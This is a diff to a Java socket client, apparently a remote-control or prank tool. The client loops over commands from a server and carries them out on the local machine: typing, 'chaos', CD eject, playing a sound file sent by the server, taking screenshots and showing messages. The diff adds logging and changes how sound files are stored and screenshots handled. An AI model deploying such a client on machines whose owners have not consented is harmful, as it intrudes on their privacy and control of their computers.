@@ -51,6 +51,8 @@ public class Client
         while(socket.isConnected())
         {
             String serverCommand = inFromServer.readLine(); // blocks
+
+            System.out.println("Command: " + serverCommand);
             if(serverCommand.equals("type")) // 1 arg commands
                 processServerCommand(serverCommand, inFromServer.readLine());
             else if(serverCommand.equals("chaos")) // 2 arg commands
@@ -59,14 +61,18 @@ public class Client
                 processServerCommand(serverCommand, inFromServer.readLine(), inFromServer.readLine(), inFromServer.readLine());
             else
                 processServerCommand(serverCommand);
-            System.out.println("Recivied from server: " + serverCommand);
         }
     }
 
+    /**
+     * retrieves the sound file that the server sent along with the "sound" command
+     * @return the File that holds the sound file from the server
+     * @throws IOException if creating a temp file for the sound file failed
+     */
     private File getSoundFileFromServer() throws IOException
     {
-        File sound = File.createTempFile("sou", ".wav", null); // todo: make sure null (default temp dir) matches with our dir (tempPath)
-        byte[] buffer = new byte[5000000];
+        File sound = File.createTempFile("sou", ".wav", new File(commandSet.getTempPath()));
+        byte[] buffer = new byte[64 * 1024];
         InputStream in = socket.getInputStream();
         FileOutputStream fos = new FileOutputStream(sound);
 
@@ -74,8 +80,9 @@ public class Client
         while ((count = in.read(buffer)) > 0)
             fos.write(buffer, 0, count);
 
+        fos.flush();
         fos.close();
-        in.close();
+        //in.close();
 
         return sound;
     }
@@ -94,30 +101,19 @@ public class Client
                 commandSet.eject();
                 return;
             case "sound": // special case: sound requires the sound file from the server so we must retrieve it
-                File sound = getSoundFileFromServer();
-                //commandSet.playSound(sound);
                 try
                 {
-                    SoundPlayer.playClip(sound);
+                    //SoundPlayer.playSound(getSoundFileFromServer());
+                    new MakeSound().playSound(getSoundFileFromServer());
                 }
                 catch(Exception e)
                 {
-
+                    System.out.println("play sound excelption");
+                    e.printStackTrace();
                 }
                 return;
             case "screenshot":
-                JPanel panel = new JPanel();
-                JFrame frame = new JFrame();
-                BufferedImage img = commandSet.takeScreenshot();
-                JLabel lbl = new JLabel(new ImageIcon(img));
-                panel.add(lbl);
-                frame.add(panel);
-                frame.setSize(Toolkit.getDefaultToolkit().getScreenSize());
-                //frame.setResizable(false);
-                //frame.setEnabled(false);
-                //frame.setAlwaysOnTop(true);
-                frame.setTitle("Hello");
-                frame.setVisible(true);
+                commandSet.takeScreenshot();
                 return;
             case "msg":
                 commandSet.showMessage(serverCommand[1], serverCommand[2], serverCommand[3]);
